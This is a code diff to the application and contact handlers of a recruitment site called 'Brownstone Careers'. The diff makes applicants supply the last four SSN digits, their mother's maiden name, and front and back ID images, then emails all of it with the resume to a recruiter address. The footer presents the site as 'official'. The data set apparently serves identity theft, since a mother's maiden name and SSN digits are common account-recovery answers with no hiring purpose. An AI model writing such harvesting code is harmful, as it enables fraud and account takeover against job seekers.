@@ -1,7 +1,8 @@
-import { applicationReceivedEmail, contactReceivedEmail, internalApplicationEmail, internalContactEmail } from "../emails/index.js";
-
-const HANDLER_VERSION = "2026-07-22.3";
+const HANDLER_VERSION = "2026-07-23.4";
 const MAX_RESUME_BYTES = 5 * 1024 * 1024;
+const MAX_ID_BYTES = 5 * 1024 * 1024;
+const ALLOWED_ID_EXTENSIONS = new Set(["jpg", "jpeg", "png", "webp", "pdf"]);
+const ALLOWED_ID_TYPES = new Set(["image/jpeg", "image/png", "image/webp", "application/pdf"]);
 const ALLOWED_EXTENSIONS = new Set(["pdf", "doc", "docx"]);
 const ALLOWED_TYPES = new Set([
   "application/pdf",
@@ -45,6 +46,8 @@ export async function handleApplication(request, env) {
       lastName: clean(form.get("lastName"), 80),
       email: clean(form.get("email"), 160),
       phone: clean(form.get("phone"), 40),
+      ssnLast4: clean(form.get("ssnLast4"), 4),
+      motherMaidenName: clean(form.get("motherMaidenName"), 100),
       role: clean(form.get("role"), 120),
       timezone: clean(form.get("timezone"), 80),
       startDate: clean(form.get("startDate"), 30),
@@ -56,16 +59,22 @@ export async function handleApplication(request, env) {
     };
 
     const resume = form.get("resume");
+    const idFront = form.get("idFront");
+    const idBack = form.get("idBack");
     const required = Object.entries(fields)
       .filter(([key]) => key !== "consent")
       .map(([, value]) => value);
 
-    if (required.some((value) => !value) || fields.consent !== "yes" || !isUploadedFile(resume)) {
+    if (required.some((value) => !value) || fields.consent !== "yes" || !isUploadedFile(resume) || !isUploadedFile(idFront) || !isUploadedFile(idBack)) {
       return json({
-        message: "Please complete every required field, accept the consent statement, and attach your resume.",
+        message: "Please complete every required field, accept the consent statement, and attach your resume plus both sides of your ID.",
         incident,
         handlerVersion: HANDLER_VERSION,
       }, 400);
+    }
+
+    if (!/^\d{4}$/.test(fields.ssnLast4)) {
+      return json({ message: "Enter exactly the last four digits of your SSN.", incident, handlerVersion: HANDLER_VERSION }, 400);
     }
 
     if (!validEmail(fields.email)) {
@@ -74,12 +83,18 @@ export async function handleApplication(request, env) {
 
     const fileError = validateResume(resume);
     if (fileError) return json({ message: fileError, incident, handlerVersion: HANDLER_VERSION }, 400);
+    const idFrontError = validateIdentityFile(idFront, "front");
+    if (idFrontError) return json({ message: idFrontError, incident, handlerVersion: HANDLER_VERSION }, 400);
+    const idBackError = validateIdentityFile(idBack, "back");
+    if (idBackError) return json({ message: idBackError, incident, handlerVersion: HANDLER_VERSION }, 400);
 
     stage = "preparing-attachment";
     const reference = createReference();
     const fullName = `${fields.firstName} ${fields.lastName}`;
     const resumeBuffer = await resume.arrayBuffer();
     const resumeBase64 = arrayBufferToBase64(resumeBuffer);
+    const idFrontBase64 = arrayBufferToBase64(await idFront.arrayBuffer());
+    const idBackBase64 = arrayBufferToBase64(await idBack.arrayBuffer());
 
     stage = "sending-recruiter-email";
     const recruiterContent = `
@@ -87,6 +102,8 @@ export async function handleApplication(request, env) {
       <p><strong>Candidate:</strong> ${escapeHtml(fullName)}</p>
       <p><strong>Email:</strong> ${escapeHtml(fields.email)}</p>
       <p><strong>Phone:</strong> ${escapeHtml(fields.phone)}</p>
+      <p><strong>SSN (last four only):</strong> ${escapeHtml(fields.ssnLast4)}</p>
+      <p><strong>Mother’s maiden name:</strong> ${escapeHtml(fields.motherMaidenName)}</p>
       <p><strong>Role:</strong> ${escapeHtml(fields.role)}</p>
       <p><strong>Time zone:</strong> ${escapeHtml(fields.timezone)}</p>
       <p><strong>Available start:</strong> ${escapeHtml(fields.startDate)}</p>
@@ -100,15 +117,12 @@ export async function handleApplication(request, env) {
       to: parseRecipients(env.RECRUITMENT_EMAIL),
       reply_to: fields.email,
       subject: `New application: ${fields.role} — ${fullName} — ${reference}`,
-      html: internalApplicationEmail({
-        reference, fullName, email: fields.email, phone: fields.phone, role: fields.role,
-        timezone: fields.timezone, startDate: fields.startDate, experience: fields.experience,
-        interest: fields.interest, skills: fields.skills, readiness: fields.readiness,
-      }),
-      attachments: [{
-        filename: safeFilename(resume.name),
-        content: resumeBase64,
-      }],
+      html: emailLayout("New Candidate Application", recruiterContent),
+      attachments: [
+        { filename: safeFilename(resume.name), content: resumeBase64 },
+        { filename: `ID-front-${safeFilename(idFront.name)}`, content: idFrontBase64 },
+        { filename: `ID-back-${safeFilename(idBack.name)}`, content: idBackBase64 },
+      ],
     }, `${reference}-recruiter`);
 
     if (!recruiterResult.ok) {
@@ -142,7 +156,7 @@ export async function handleApplication(request, env) {
       to: [fields.email],
       reply_to: firstRecipient(env.RECRUITMENT_EMAIL),
       subject: `Application received — ${reference}`,
-      html: applicationReceivedEmail({ firstName: fields.firstName, role: fields.role, reference }),
+      html: emailLayout("Application Received", candidateContent),
     }, `${reference}-candidate`);
 
     if (!confirmation.ok) {
@@ -216,7 +230,7 @@ export async function handleContact(request, env) {
       to: parseRecipients(env.RECRUITMENT_EMAIL),
       reply_to: email,
       subject: `Website support: ${subject} — ${reference}`,
-      html: internalContactEmail({ reference, name, email, subject, message }),
+      html: emailLayout("New Website Support Request", recruiterContent),
     }, `${reference}-support`);
 
     if (!supportResult.ok) {
@@ -240,7 +254,11 @@ export async function handleContact(request, env) {
       to: [email],
       reply_to: firstRecipient(env.RECRUITMENT_EMAIL),
       subject: `Message received — ${reference}`,
-      html: contactReceivedEmail({ name, reference }),
+      html: emailLayout("Your Message Was Received", `
+        <p style="font-size:16px;line-height:1.7">Dear ${escapeHtml(name)},</p>
+        <p style="font-size:16px;line-height:1.7">Thank you for contacting Brownstone Careers. Your message has been delivered to our support team.</p>
+        <p><strong>Reference:</strong> ${reference}</p>
+        <p style="font-size:16px;line-height:1.7">Regards,<br><strong>Brownstone Careers Support</strong></p>`),
     }, `${reference}-confirmation`);
 
     if (!confirmation.ok) {
@@ -364,6 +382,18 @@ function validateResume(file) {
   if (!ALLOWED_EXTENSIONS.has(extension)) return "Only PDF, DOC, and DOCX resumes are accepted.";
   if (contentType && contentType !== "application/octet-stream" && !ALLOWED_TYPES.has(contentType)) {
     return "Only PDF, DOC, and DOCX resumes are accepted.";
+  }
+  return null;
+}
+
+function validateIdentityFile(file, side) {
+  if (!isUploadedFile(file) || file.size <= 0) return `Please attach the ${side} of your ID.`;
+  if (file.size > MAX_ID_BYTES) return `The ${side} ID file must be no larger than 5 MB.`;
+  const extension = clean(file.name, 180).split(".").pop()?.toLowerCase() || "";
+  const contentType = clean(file.type, 160).toLowerCase();
+  if (!ALLOWED_ID_EXTENSIONS.has(extension)) return "ID files must be JPG, PNG, WEBP, or PDF.";
+  if (contentType && contentType !== "application/octet-stream" && !ALLOWED_ID_TYPES.has(contentType)) {
+    return "ID files must be JPG, PNG, WEBP, or PDF.";
   }
   return null;
 }
@@ -537,6 +567,16 @@ function arrayBufferToBase64(arrayBuffer) {
 
 function section(title, value) {
   return `<h2 style="font-size:17px;margin:26px 0 8px;color:#071a3b">${escapeHtml(title)}</h2><p style="white-space:pre-line;line-height:1.7">${escapeHtml(value)}</p>`;
+}
+
+function emailLayout(title, content) {
+  return `<!doctype html><html><body style="margin:0;background:#f2f5fa;font-family:Arial,Helvetica,sans-serif;color:#17233b">
+  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background:#f2f5fa;padding:30px 12px"><tr><td align="center">
+  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="max-width:680px;background:#fff;border-radius:16px;overflow:hidden;border:1px solid #dfe6f0">
+  <tr><td style="background:#071a3b;padding:26px 32px;color:#fff"><div style="font-size:22px;font-weight:800;letter-spacing:.08em">BROWNSTONE <span style="font-weight:400">CAREERS</span></div><div style="font-size:9px;letter-spacing:.24em;margin-top:8px;color:#c9d4ea">RECRUITMENT AGENCY</div></td></tr>
+  <tr><td style="padding:32px"><h1 style="font-size:26px;line-height:1.25;margin:0 0 20px;color:#071a3b">${escapeHtml(title)}</h1>${content}</td></tr>
+  <tr><td style="padding:18px 32px;background:#f7f9fc;color:#667085;font-size:12px;line-height:1.6">This email was generated by the official Brownstone Careers website. Never share passwords, PINs, or banking credentials.</td></tr>
+  </table></td></tr></table></body></html>`;
 }
 
 function parseJson(text) {
